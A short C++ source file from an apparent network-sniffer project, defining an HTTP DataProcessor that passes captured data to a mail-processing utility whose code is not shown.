#include "http/data_processor.hpp"

#include "http/collected_data.hpp"
#include "util/base64.hpp"
#include "util/file.hpp"
#include "util/mail_process.hpp"

namespace cs::http {

int DataProcessor::process(const cs::base::CollectedData &sniffer_data_arg) {

    const CollectedData &sniffer_data = (const CollectedData &) sniffer_data_arg;
    util::mail_process(sniffer_data.get_data());

    return 1;

}


DataProcessor::~DataProcessor() {}

}